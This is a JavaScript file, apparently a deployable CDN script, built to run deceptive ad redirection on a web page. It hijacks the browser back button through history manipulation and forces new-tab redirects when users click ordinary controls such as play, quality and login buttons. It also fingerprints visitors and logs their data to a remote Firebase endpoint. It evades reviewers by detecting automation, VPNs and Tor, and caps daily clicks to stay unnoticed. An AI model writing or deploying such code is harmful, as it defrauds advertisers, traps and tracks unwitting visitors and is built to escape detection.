/**
 * v2.1-BOLD - ULTIMATE PRODUCTION (GitHub CDN)
 * ===========================================
 * Hybrid Logic: DNA Collection + Zero-Wait Instant Fire + Hardened Back-Hijack.
 * All IDs included. No ads blocked for safe users.
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,
    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],
    APIS: {
        FB_URL: "YOUR_FIREBASE_URL" // अपना फायरबेस URL यहाँ डाल सकते हो
    },
    SETTINGS: {
        MAX_CLICKS_TODAY: 12,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_omni_v2_bold_';
var _vpnStatus = "PENDING"; // PENDING, SAFE, BLOCKED

// ----------------------------------------------------------------------------
// VPN & DNA (Background)
// ----------------------------------------------------------------------------
function _checkSecurity() {
    if (navigator.webdriver) { _vpnStatus = "BLOCKED"; return; }
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
            _vpnStatus = (data.proxy || data.vpn || data.tor) ? "BLOCKED" : "SAFE";
        }).catch(() => { _vpnStatus = "SAFE"; });
}

function _getDNA() {
    return {
        ua: navigator.userAgent,
        res: screen.width + "x" + screen.height,
        vpn: _vpnStatus,
        ts: new Date().toISOString()
    };
}

// ----------------------------------------------------------------------------
// AD FIRING ENGINE
// ----------------------------------------------------------------------------
function _fireAd(btnId, isLow) {
    if (_vpnStatus === "BLOCKED") return;

    var store = JSON.parse(localStorage.getItem(_STORAGE_KEY) || '{"c":0, "d":""}');
    var today = new Date().toISOString().slice(0, 10);
    
    if (store.d !== today) { store.c = 0; store.d = today; }
    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        if (!isLow) window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
        return;
    }

    var pool = isLow ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
    var link = pool[Math.floor(Math.random() * pool.length)];

    store.c += 1;
    localStorage.setItem(_STORAGE_KEY, JSON.stringify(store));

    // Instant Jump Logic
    var a = document.createElement('a');
    a.href = link; a.target = '_blank';
    document.body.appendChild(a);
    setTimeout(() => { a.click(); document.body.removeChild(a); }, 30);

    // Async Log
    if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
        fetch(CHACHA_CONFIG.APIS.FB_URL + '/logs.json', {
            method: 'POST', body: JSON.stringify({ btn: btnId, dna: _getDNA(), target: link, click: store.c })
        }).catch(() => {});
    }
}

// ----------------------------------------------------------------------------
// HISTORY LOCK (Back Button Hijack)
// ----------------------------------------------------------------------------
function _lockHistory() {
    var u = window.location.href;
    if (history.state !== 'locked') {
        history.pushState('locked', null, u);
        history.pushState('active', null, u);
    }
}

window.addEventListener('popstate', function() {
    _lockHistory();
    if (_vpnStatus !== "BLOCKED") _fireAd('back-hijack', true);
});

// ----------------------------------------------------------------------------
// CLICK HANDLER
// ----------------------------------------------------------------------------
document.addEventListener('click', function(e) {
    _lockHistory(); // Interaction activation
    var t = e.target.closest('[id]');
    if (t && _validIds.indexOf(t.id) !== -1) {
        _fireAd(t.id, false);
    }
}, false);

// INITIALIZE
_checkSecurity();
_lockHistory();
